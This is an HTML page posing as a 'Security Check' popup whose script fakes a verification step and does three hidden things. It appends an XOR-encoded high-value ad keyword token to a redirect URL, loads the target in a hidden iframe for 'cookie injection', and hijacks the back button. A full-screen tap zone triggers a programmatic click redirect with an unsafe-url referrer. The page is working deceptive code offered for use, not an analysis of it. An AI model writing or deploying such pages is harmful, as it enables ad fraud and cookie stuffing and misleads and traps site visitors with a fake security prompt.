<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="unsafe-url"> 
    <title>Security Verification</title>
    <style>
        body { 
            margin: 0; padding: 0; 
            background-color: #eef2f6; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex; justify-content: center; align-items: center; 
            height: 100vh; overflow: hidden; user-select: none;
        }
        
        .overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.5); 
            display: flex; justify-content: center; align-items: center;
            backdrop-filter: blur(5px); 
        }

        .popup-card {
            background: #ffffff;
            width: 85%; max-width: 360px;
            padding: 35px 25px;
            border-radius: 18px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
            text-align: center;
            animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            position: relative;
        }

        @keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }

        .shield-icon {
            width: 65px; height: 65px;
            background: #e3f2fd;
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            margin: 0 auto 20px;
            transition: all 0.3s ease;
        }
        .shield-icon svg { width: 35px; height: 35px; fill: #2196f3; transition: fill 0.3s ease; }

        h2 { margin: 0 0 10px; color: #2d3436; font-size: 22px; font-weight: 700; }
        p { color: #636e72; font-size: 15px; margin: 0 0 25px; line-height: 1.6; }

        .loader-bar {
            width: 100%; height: 6px;
            background: #dfe6e9;
            border-radius: 10px;
            overflow: hidden;
            margin-top: 10px;
            display: none;
        }
        .progress {
            width: 0%; height: 100%;
            background: #00b894; 
            border-radius: 10px;
            transition: width 0.6s ease;
        }

        .interaction-hint {
            font-size: 13px; color: #b2bec3; margin-top: 20px;
            display: flex; align-items: center; justify-content: center; gap: 6px;
        }
        .blink { animation: blinker 2s linear infinite; }
        @keyframes blinker { 50% { opacity: 0.5; } }
        
        .tap-zone { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; cursor: pointer; }
        
        /* Hidden iFrame for Cookie Warming */
        #warmup-frame { display: none; visibility: hidden; width: 1px; height: 1px; }
    </style>
</head>
<body>

    <a id="hidden-link" href="#" style="display:none;" rel="noreferrer"></a>

    <div class="tap-zone" id="clickArea"></div>

    <div id="iframe-container"></div>

    <div class="overlay">
        <div class="popup-card">
            <div class="shield-icon" id="iconBox">
                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
            </div>
            
            <h2 id="statusTitle">Security Check</h2>
            <p id="statusMsg">Please <strong>Tap anywhere</strong> to verify connection.</p>
            <div class="loader-bar" id="loader"><div class="progress" id="progressBar"></div></div>
            
            <div class="interaction-hint blink" id="hint">
                <span>Waiting for verification...</span>
            </div>
        </div>
    </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        let targetUrl = params.get('url');
        let verified = false;
        const SECRET_KEY = "MySuperSecretKey2025"; 

        const highPayingKeys = [
            "mesothelioma_attorney_assistance", "donate_car_tax_credit_usa",
            "crypto_trading_premium_account", "business_loan_bad_credit_approval",
            "online_degree_cyber_security_mba", "structured_settlement_annuity_companies",
            "truck injury lawyer", "truck injury attorney", "accident attorney near me",
            "attorney car wreck", "accident attorney", "motorcycle injury lawyers",
            "truck crash lawyers", "truck crash attorney", "top truck accident lawyers",
            "car wreck lawyer", "car wreck attorneys", "accident lawyer",
            "auto accident attorney", "attorneys car accident", "best accident lawyers",
            "auto accident lawyers near me", "auto accident attorneys near me",
            "car accident attorney near me", "car wreck lawyer near me",
            "car accident law", "mycoverageinfo agent", "accident lawyer near me",
            "slip and fall lawyer", "injury law firms", "car crash attorneys",
            "motorcycle accident lawyer", "motorcycle accident attorneys",
            "motorcycle accident injury attorney", "injury attorney",
            "slip and fall attorney", "car accident lawyers near me"
        ];

        function encryptData(text, key) {
            let result = "";
            for (let i = 0; i < text.length; i++) {
                result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
            }
            return btoa(result);
        }

        // --- 1. STRATEGY: HISTORY MANIPULATION ---
        // Fake depth create karta hai taaki browser ko lage user purana hai
        try {
            history.pushState(null, null, location.href); 
            window.onpopstate = function () {
                history.go(1);
            };
        } catch(e) {}

        // --- URL PROCESSING ---
        if (targetUrl) {
            try {
                targetUrl = decodeURIComponent(targetUrl);
                targetUrl = targetUrl.replace(/[?&]m=1/, ''); // Blogger Fix
                
                let rawKey = highPayingKeys[Math.floor(Math.random() * highPayingKeys.length)];
                let securePayload = encryptData(rawKey, SECRET_KEY);
                let separator = targetUrl.includes('?') ? '&' : '?';
                targetUrl = targetUrl + separator + 'auth=verified&token=' + securePayload;

                // --- 2. STRATEGY: IFRAME WARMING (COOKIE INJECTION) ---
                // Background me site load karta hai (1.5 sec delay taaki main UI lag na ho)
                setTimeout(() => {
                    let iframe = document.createElement('iframe');
                    iframe.id = 'warmup-frame';
                    iframe.src = targetUrl;
                    document.getElementById('iframe-container').appendChild(iframe);
                    console.log('Cache warming started...');
                }, 1500);

            } catch (e) { console.log('URL Error'); }
        }

        function verifyAndRedirect() {
            if (verified) return;
            verified = true;

            if (targetUrl) {
                document.getElementById('statusTitle').innerText = "Verifying...";
                document.getElementById('statusMsg').innerText = "Connection secured. Redirecting...";
                document.getElementById('hint').style.display = 'none';
                document.getElementById('loader').style.display = 'block';
                document.getElementById('iconBox').style.background = "#dff9fb";
                document.querySelector('.shield-icon svg').style.fill = "#00b894";

                setTimeout(() => { document.getElementById('progressBar').style.width = "100%"; }, 100);

                // --- KEY: PROGRAMMATIC CLICK ---
                setTimeout(() => {
                    let link = document.getElementById('hidden-link');
                    link.href = targetUrl;
                    link.click(); 
                }, 600); // 600ms delay for visual effect
            } else {
                document.getElementById('statusTitle').innerText = "Link Error";
                document.getElementById('statusMsg').innerText = "Destination missing.";
                document.getElementById('statusMsg').style.color = "#d63031";
            }
        }

        // --- TRIGGERS ---
        let clickZone = document.getElementById('clickArea');
        clickZone.addEventListener('click', verifyAndRedirect);
        clickZone.addEventListener('touchstart', verifyAndRedirect, {passive: false});

    </script>

</body>
</html>
